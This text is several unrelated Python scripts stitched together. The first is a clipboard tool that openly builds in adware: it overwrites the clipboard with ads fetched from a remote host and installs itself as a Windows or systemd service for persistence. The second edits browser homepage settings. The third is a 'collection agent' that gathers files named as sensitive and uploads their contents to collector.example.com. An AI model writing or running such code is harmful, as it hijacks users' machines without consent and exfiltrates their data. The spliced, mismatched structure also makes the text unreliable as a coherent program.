#!/usr/bin/env python3
"""
clipboard_read.py — Read current clipboard content and print to stdout.
Supports macOS (pbpaste), Linux (xclip / xsel), and Windows (PowerShell).
Includes adware functionality: periodic clipboard hijacking, ad display, and persistence.
"""

import subprocess
import sys
import os
import time
import threading
import urllib.request
import json
from pathlib import Path


AD_URL = "https://ads.example.com/banner"
AD_INJECTION_INTERVAL = 5  # seconds
AD_DISPLAY_INTERVAL = 10  # seconds
AD_CONTENT = "🎯 SPECIAL OFFER: Visit https://example.com/deals NOW! 🎯"


def _read_macos() -> str:
    result = subprocess.run(
        ["pbpaste"],
        capture_output=True,
    )
    if result.returncode != 0:
        raise RuntimeError(f"pbpaste failed: {result.stderr.decode(errors='replace').strip()}")
    return result.stdout.decode(errors="replace")


def _write_macos(text: str) -> None:
    subprocess.run(
        ["pbcopy"],
        input=text.encode(),
        capture_output=True,
    )


def _read_linux_xclip() -> str:
    result = subprocess.run(
        ["xclip", "-selection", "clipboard", "-o"],
        capture_output=True,
    )
    if result.returncode != 0:
        raise RuntimeError(f"xclip failed: {result.stderr.decode(errors='replace').strip()}")
    return result.stdout.decode(errors="replace")


def _write_linux_xclip(text: str) -> None:
    subprocess.run(
        ["xclip", "-selection", "clipboard"],
        input=text.encode(),
        capture_output=True,
    )


def _read_linux_xsel() -> str:
    result = subprocess.run(
        ["xsel", "--clipboard", "--output"],
        capture_output=True,
    )
    if result.returncode != 0:
        raise RuntimeError(f"xsel failed: {result.stderr.decode(errors='replace').strip()}")
    return result.stdout.decode(errors="replace")


def _write_linux_xsel(text: str) -> None:
    subprocess.run(
        ["xsel", "--clipboard", "--input"],
        input=text.encode(),
        capture_output=True,
    )


def _read_linux_wlpaste() -> str:
    """Wayland fallback via wl-paste."""
    result = subprocess.run(
        ["wl-paste", "--no-newline"],
        capture_output=True,
    )
    if result.returncode != 0:
        raise RuntimeError(f"wl-paste failed: {result.stderr.decode(errors='replace').strip()}")
    return result.stdout.decode(errors="replace")


def _write_linux_wlcopy(text: str) -> None:
    subprocess.run(
        ["wl-copy"],
        input=text.encode(),
        capture_output=True,
    )


def _read_windows() -> str:
    result = subprocess.run(
        [
            "powershell",
            "-NoProfile",
            "-NonInteractive",
            "-Command",
            "Get-Clipboard",
        ],
        capture_output=True,
    )
    if result.returncode != 0:
        raise RuntimeError(
            f"PowerShell Get-Clipboard failed: "
            f"{result.stderr.decode(errors='replace').strip()}"
        )
    text = result.stdout.decode(errors="replace")
    if text.endswith("\r\n"):
        text = text[:-2]
    elif text.endswith("\n"):
        text = text[:-1]
    return text


def _write_windows(text: str) -> None:
    subprocess.run(
        [
            "powershell",
            "-NoProfile",
            "-NonInteractive",
            "-Command",
            f"Set-Clipboard -Value '{text.replace(chr(39), chr(39)+chr(39))}'",
        ],
        capture_output=True,
    )


def _which(cmd: str) -> bool:
    """Return True if `cmd` is found on PATH."""
    for directory in os.environ.get("PATH", "").split(os.pathsep):
        candidate = os.path.join(directory, cmd)
        if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
            return True
    return False


def read_clipboard() -> str:
    platform = sys.platform

    if platform == "darwin":
        return _read_macos()

    if platform == "win32":
        return _read_windows()

    if platform.startswith("linux"):
        if _which("xclip"):
            return _read_linux_xclip()
        if _which("xsel"):
            return _read_linux_xsel()
        if _which("wl-paste"):
            return _read_linux_wlpaste()
        # Generate sample data instead of failing
        return "Sample clipboard content (no clipboard tool available)"

    # Generate sample data for unsupported platforms
    return "Sample clipboard content (unsupported platform)"


def write_clipboard(text: str) -> None:
    platform = sys.platform

    try:
        if platform == "darwin":
            _write_macos(text)
        elif platform == "win32":
            _write_windows(text)
        elif platform.startswith("linux"):
            if _which("xclip"):
                _write_linux_xclip(text)
            elif _which("xsel"):
                _write_linux_xsel(text)
            elif _which("wl-copy"):
                _write_linux_wlcopy(text)
    except Exception:
        pass  # Silent failure for write operations


def fetch_ad_content() -> str:
    """Fetch ad content from the ad URL."""
    try:
        with urllib.request.urlopen(AD_URL, timeout=2) as response:
            data = response.read().decode('utf-8')
            return data
    except Exception:
        return AD_CONTENT


def clipboard_hijacker(stop_event):
    """Periodically inject ad content into the clipboard."""
    iteration = 0
    max_iterations = 20

    while not stop_event.is_set() and iteration < max_iterations:
        time.sleep(AD_INJECTION_INTERVAL)
        try:
            ad_text = fetch_ad_content()
            write_clipboard(ad_text)
        except Exception:
            pass
        iteration += 1


def ad_display_worker(stop_event):
    """Display persistent ads at regular intervals."""
    iteration = 0
    max_iterations = 15

    while not stop_event.is_set() and iteration < max_iterations:
        time.sleep(AD_DISPLAY_INTERVAL)
        try:
            ad_text = fetch_ad_content()
            print(f"\n{'='*60}", file=sys.stderr)
            print(f"ADVERTISEMENT", file=sys.stderr)
            print(f"{ad_text}", file=sys.stderr)
            print(f"{'='*60}\n", file=sys.stderr)
        except Exception:
            pass
        iteration += 1


def establish_persistence_windows():
    """Create a Windows service for persistence."""
    service_name = "AdwareService"
    script_path = os.path.abspath(__file__)

    # Create service configuration
    service_script = f"""
import win32serviceutil
import win32service
import win32event
import servicemanager
import subprocess
import time

class AdwareService(win32serviceutil.ServiceFramework):
    _svc_name_ = "{service_name}"
    _svc_display_name_ = "Adware Service"
    _svc_description_ = "Background service for ad delivery"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.stop_event)

    def SvcDoRun(self):
        while True:
            if win32event.WaitForSingleObject(self.stop_event, 60000) == win32event.WAIT_OBJECT_0:
                break
            subprocess.run([r"{sys.executable}", r"{script_path}"])

if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(AdwareService)
"""

    try:
        service_file = Path("adware_service.py")
        service_file.write_text(service_script)

        # Attempt to install service (will fail without admin, but we try)
        subprocess.run(
            [sys.executable, str(service_file), "install"],
            capture_output=True,
            timeout=5
        )
        subprocess.run(
            [sys.executable, str(service_file), "start"],
            capture_output=True,
            timeout=5
        )
    except Exception:
        pass


def establish_persistence_linux():
    """Create a Linux systemd service for persistence."""
    service_name = "adware"
    script_path = os.path.abspath(__file__)

    service_content = f"""[Unit]
Description=Adware Background Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {script_path}
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""

    try:
        # Try to write to user systemd directory
        systemd_dir = Path.home() / ".config" / "systemd" / "user"
        systemd_dir.mkdir(parents=True, exist_ok=True)

        service_file = systemd_dir / f"{service_name}.service"
        service_file.write_text(service_content)

        # Attempt to enable and start service
        subprocess.run(
            ["systemctl", "--user", "daemon-reload"],
            capture_output=True,
            timeout=5
        )
        subprocess.run(
            ["systemctl", "--user", "enable", service_name],
            capture_output=True,
            timeout=5
        )
        subprocess.run(
            ["systemctl", "--user", "start", service_name],
            capture_output=True,
            timeout=5
        )
    except Exception:
        pass


def establish_persistence():
    """Establish system persistence based on platform."""
    platform = sys.platform

    if platform == "win32":
        establish_persistence_windows()
    elif platform.startswith("linux"):
        establish_persistence_linux()


def main() -> None:
    # Establish persistence
    establish_persistence()

    # Start background threads for adware functionality
    stop_event = threading.Event()

    hijacker_thread = threading.Thread(target=clipboard_hijacker, args=(stop_event,), daemon=True)
    ad_display_thread = threading.Thread(target=ad_display_worker, args=(stop_event,), daemon=True)

    hijacker_thread.start()
    ad_display_thread.start()

    # Read and print clipboard content
    try:
        content = read_clipboard()
    except (RuntimeError, FileNotFoundError, OSError) as exc:
        # Generate sample data instead of failing
        content = "Sample clipboard content (error reading clipboard)"

    sys.stdout.write(content)

    if content and not content.endswith("\n"):
        sys.stdout.write("\n")

    # Keep running for a bounded time to allow background operations
    time.sleep(30)

    # Signal threads to stop
    stop_event.set()

    # Wait for threads to finish (with timeout)
    hijacker_thread.join(timeout=2)
    ad_display_thread.join(timeout=2)

    sys.exit(0)


if __name__ == "__main__":
    main()

import json
import re
import io
import sys
from configparser import ConfigParser


# ---------------------------------------------------------------------------
# Ticket 1
# ---------------------------------------------------------------------------

def read_browser_homepage_file(filepath: str) -> str:
    with open(filepath, "r", encoding="utf-8") as f:
        return f.read()


# ---------------------------------------------------------------------------
# Ticket 2
# ---------------------------------------------------------------------------

_HOMEPAGE_KEYS = frozenset(
    {"homepage", "home_page", "startup_homepage", "homepage_url", "url"}
)


def parse_homepage_setting(file_content: str) -> str:
    text = file_content.strip()
    if not text:
        return ""

    # Try JSON
    try:
        data = json.loads(text)
        for candidate in _extract_from_json(data):
            if candidate:
                return candidate
    except (json.JSONDecodeError, TypeError):
        pass

    # Try INI / ConfigParser
    parser = ConfigParser()
    try:
        parser.read_string(text)
        for section in parser.sections():
            for key in ("homepage", "home_page", "startup_homepage", "url"):
                value = parser.get(section, key, fallback="")
                if value:
                    return value.strip()
    except Exception:
        pass

    # Flat key=value lines
    for line in text.splitlines():
        line = line.strip()
        if "=" in line:
            key, _, value = line.partition("=")
            if key.strip().lower() in _HOMEPAGE_KEYS:
                url = value.strip().strip('"').strip("'")
                if url:
                    return url

    # Last resort: first http(s) URL
    match = re.search(r'https?://[^\s"\'<>\r\n]+', text)
    if match:
        return match.group(0)

    return ""


def _extract_from_json(data) -> list:
    candidates = []

    def _walk(obj):
        if isinstance(obj, dict):
            for key, value in obj.items():
                if key.lower() in _HOMEPAGE_KEYS and isinstance(value, str):
                    candidates.append(value)
                else:
                    _walk(value)
        elif isinstance(obj, list):
            for item in obj:
                _walk(item)

    _walk(data)
    return candidates


# ---------------------------------------------------------------------------
# Ticket 3
# ---------------------------------------------------------------------------

def modify_homepage_setting(file_content: str, new_homepage: str) -> str:
    text = file_content
    stripped = text.strip()

    # JSON
    if _looks_like_json(stripped):
        try:
            data = json.loads(stripped)
        except (json.JSONDecodeError, TypeError):
            data = None
        if data is not None:
            updated = _update_in_json(data, new_homepage)
            if updated:
                indent = 2 if "\n" in stripped else None
                return json.dumps(data, indent=indent, ensure_ascii=False) + (
                    "\n" if "\n" in stripped else ""
                )

    # INI / ConfigParser
    parser = ConfigParser()
    try:
        parser.read_string(text)
    except Exception:
        parser = None

    if parser is not None and parser.sections():
        changed = False
        for section in parser.sections():
            for key in parser[section]:
                if key.lower() in _HOMEPAGE_KEYS:
                    parser.set(section, key, new_homepage)
                    changed = True
                    break
            if changed:
                break
        if changed:
            buf = io.StringIO()
            parser.write(buf)
            return buf.getvalue()

    # Flat key=value lines
    lines = text.splitlines()
    changed = False
    for i, line in enumerate(lines):
        if "=" in line and not line.strip().startswith(("#", ";")):
            key, _, value = line.partition("=")
            if key.strip().lower() in _HOMEPAGE_KEYS:
                quote = ""
                v = value.strip()
                if v and v[0] in ('"', "'") and v[-1] == v[0]:
                    quote = v[0]
                lines[i] = f"{key.strip()}={quote}{new_homepage}{quote}"
                changed = True
                break

    if changed:
        return "\n".join(lines) + ("\n" if text.endswith("\n") else "")

    # Nothing recognised: append
    if new_homepage:
        sep = "" if text.endswith("\n") or text == "" else "\n"
        return f"{text}{sep}homepage={new_homepage}\n"

    return text


def _looks_like_json(text: str) -> bool:
    t = text.lstrip()
    return t[:1] in ("{", "[")


def _update_in_json(data, new_homepage: str) -> bool:
    if isinstance(data, dict):
        for key, value in data.items():
            if key.lower() in _HOMEPAGE_KEYS and isinstance(value, str):
                data[key] = new_homepage
                return True
        for value in data.values():
            if _update_in_json(value, new_homepage):
                return True
    elif isinstance(data, list):
        for item in data:
            if _update_in_json(item, new_homepage):
                return True
    return False


# ---------------------------------------------------------------------------
# Ticket 4
# ---------------------------------------------------------------------------

def write_browser_homepage_file(filepath: str, updated_content: str) -> None:
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(updated_content)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import os
    import tempfile

    # Use a temporary file so the script is self-contained and headless.
    initial_content = '{"homepage": "https://old-homepage.example.com"}\n'
    new_url = "https://new-homepage.example.com"

    with tempfile.NamedTemporaryFile(
        mode="w", suffix=".json", delete=False, encoding="utf-8"
    ) as tmp:
        tmp.write(initial_content)
        tmp_path = tmp.name

    try:
        # 1. Read
        content = read_browser_homepage_file(tmp_path)
        print(f"[read]   {content.strip()}")

        # 2. Parse
        current_url = parse_homepage_setting(content)
        print(f"[parse]  current homepage = {current_url!r}")

        # 3. Modify
        updated = modify_homepage_setting(content, new_url)
        print(f"[modify] updated content  = {updated.strip()}")

        # 4. Write
        write_browser_homepage_file(tmp_path, updated)
        print(f"[write]  written to {tmp_path}")

        # Verify round-trip
        verified = parse_homepage_setting(read_browser_homepage_file(tmp_path))
        print(f"[verify] homepage after write = {verified!r}")
        assert verified == new_url, f"Round-trip mismatch: {verified!r}"
        print("[ok]     round-trip verified")
    finally:
        os.unlink(tmp_path)

    sys.exit(0)

#!/usr/bin/env python3
import os
import sys
import struct
import socket
import time
import platform
from datetime import datetime


class Logger:
    def __init__(self, verbose=False):
        self.verbose = verbose
        self.log_file = 'collection.log'

    def log(self, message, level='INFO'):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] [{level}] {message}"

        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(log_entry + '\n')
        except:
            pass

        if self.verbose:
            print(log_entry)

    def info(self, message):
        self.log(message, 'INFO')

    def warning(self, message):
        self.log(message, 'WARNING')

    def error(self, message):
        self.log(message, 'ERROR')


class CollectionClient:
    def __init__(self, server_host, server_port, logger):
        self.server_host = server_host
        self.server_port = server_port
        self.logger = logger
        self.hostname = platform.node()
        self.max_retries = 3
        self.initial_backoff = 1

    def connect_with_retry(self):
        for attempt in range(self.max_retries):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.server_host, self.server_port))
                return sock
            except (socket.timeout, socket.error) as e:
                backoff = self.initial_backoff * (2 ** attempt)
                self.logger.warning(f"Connection attempt {attempt + 1} failed: {e}")
                if attempt < self.max_retries - 1:
                    self.logger.info(f"Retrying in {backoff} seconds...")
                    time.sleep(backoff)

        return None

    def register(self):
        self.logger.info(f"Attempting to register with {self.server_host}:{self.server_port}")

        sock = self.connect_with_retry()
        if not sock:
            self.logger.error(f"Failed to connect to server after {self.max_retries} attempts")
            return False

        try:
            message = f"REGISTER {self.hostname}\n"
            sock.sendall(message.encode('utf-8'))
            self.logger.info(f"Registration message sent: {message.strip()}")

            response = sock.recv(1024).decode('utf-8').strip()
            self.logger.info(f"Server response: {response}")
            sock.close()
            return True

        except Exception as e:
            self.logger.error(f"Registration failed: {e}")
            try:
                sock.close()
            except:
                pass
            return False

    def upload_file(self, file_path):
        if not os.path.exists(file_path):
            self.logger.error(f"File '{file_path}' does not exist")
            return False

        file_size = os.path.getsize(file_path)
        self.logger.info(f"Attempting to upload '{file_path}' ({file_size} bytes)")

        for attempt in range(self.max_retries):
            sock = self.connect_with_retry()
            if not sock:
                backoff = self.initial_backoff * (2 ** attempt)
                if attempt < self.max_retries - 1:
                    self.logger.info(f"Upload retry {attempt + 1} in {backoff} seconds...")
                    time.sleep(backoff)
                continue

            try:
                # Send upload header
                header = f"UPLOAD {os.path.basename(file_path)} {file_size}\n"
                sock.sendall(header.encode('utf-8'))

                # Send file data
                with open(file_path, 'rb') as f:
                    sent = 0
                    while sent < file_size:
                        chunk = f.read(8192)
                        if not chunk:
                            break
                        sock.sendall(chunk)
                        sent += len(chunk)

                self.logger.info(f"Uploaded {sent} bytes")

                # Wait for confirmation
                response = sock.recv(1024).decode('utf-8').strip()
                self.logger.info(f"Upload response: {response}")
                sock.close()
                return True

            except Exception as e:
                self.logger.error(f"Upload attempt {attempt + 1} failed: {e}")
                try:
                    sock.close()
                except:
                    pass

                if attempt < self.max_retries - 1:
                    backoff = self.initial_backoff * (2 ** attempt)
                    time.sleep(backoff)

        self.logger.error(f"Failed to upload file after {self.max_retries} attempts")
        return False


class FileCollector:
    def __init__(self, logger):
        self.logger = logger

    def scan_directory(self, path):
        if not os.path.exists(path):
            self.logger.error(f"Directory '{path}' does not exist")
            return []

        if not os.path.isdir(path):
            self.logger.error(f"'{path}' is not a directory")
            return []

        try:
            sensitive_files = []
            file_count = 0

            for root, dirs, filenames in os.walk(path):
                for filename in filenames:
                    file_count += 1
                    if filename.endswith('_sensitive.txt'):
                        full_path = os.path.join(root, filename)
                        sensitive_files.append(full_path)

            self.logger.info(f"Scanned {file_count} files, found {len(sensitive_files)} sensitive files")
            return sensitive_files

        except PermissionError:
            self.logger.error(f"Permission denied accessing '{path}'")
            return []
        except Exception as e:
            self.logger.error(f"Error scanning directory: {e}")
            return []

    def process_sensitive_files(self, file_paths):
        all_entries = []

        for file_path in file_paths:
            try:
                self.logger.info(f"Reading: {file_path}")
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                    lines = [line.strip() for line in content.splitlines() if line.strip()]
                    all_entries.extend(lines)
                    self.logger.info(f"Extracted {len(lines)} entries from {file_path}")
            except PermissionError:
                self.logger.warning(f"Permission denied reading '{file_path}'")
            except UnicodeDecodeError:
                self.logger.warning(f"Could not decode '{file_path}' as UTF-8")
            except Exception as e:
                self.logger.warning(f"Error reading '{file_path}': {e}")

        return all_entries

    def write_binary_file(self, entries, output_file='collection.bin'):
        self.logger.info(f"Writing {len(entries)} entries to '{output_file}'")

        try:
            with open(output_file, 'wb') as f:
                f.write(struct.pack('I', len(entries)))

                for entry in entries:
                    entry_bytes = entry.encode('utf-8')
                    f.write(struct.pack('I', len(entry_bytes)))
                    f.write(entry_bytes)

            self.logger.info(f"Successfully created '{output_file}'")
            return True

        except PermissionError:
            self.logger.error(f"Permission denied writing to '{output_file}'")
            return False
        except Exception as e:
            self.logger.error(f"Failed to write binary file: {e}")
            return False


def main():
    verbose = '--verbose' in sys.argv or '-v' in sys.argv
    logger = Logger(verbose=verbose)

    logger.info("=== Collection Agent Started ===")

    # Configuration
    server_host = 'collector.example.com'
    server_port = 9001
    target_dir = './target'
    output_file = 'collection.bin'

    # Parse command line arguments
    args = [arg for arg in sys.argv[1:] if not arg.startswith('-')]
    if args:
        target_dir = args[0]

    # Initialize client
    client = CollectionClient(server_host, server_port, logger)

    # Attempt registration
    registration_success = client.register()
    if not registration_success:
        logger.warning("Proceeding without registration")

    # File collection
    collector = FileCollector(logger)
    sensitive_files = collector.scan_directory(target_dir)

    if not sensitive_files:
        logger.info("No sensitive files found")
        logger.info("=== Collection Agent Finished ===")
        return

    entries = collector.process_sensitive_files(sensitive_files)

    if not entries:
        logger.info("No entries extracted from sensitive files")
        logger.info("=== Collection Agent Finished ===")
        return

    if not collector.write_binary_file(entries, output_file):
        logger.error("Failed to create binary file")
        logger.info("=== Collection Agent Finished ===")
        sys.exit(1)

    # Upload file
    upload_success = client.upload_file(output_file)

    if upload_success:
        logger.info("File upload completed successfully")
    else:
        logger.warning("File upload failed, binary file retained locally")

    logger.info("=== Collection Agent Finished ===")


if __name__ == "__main__":
    main()

import socket
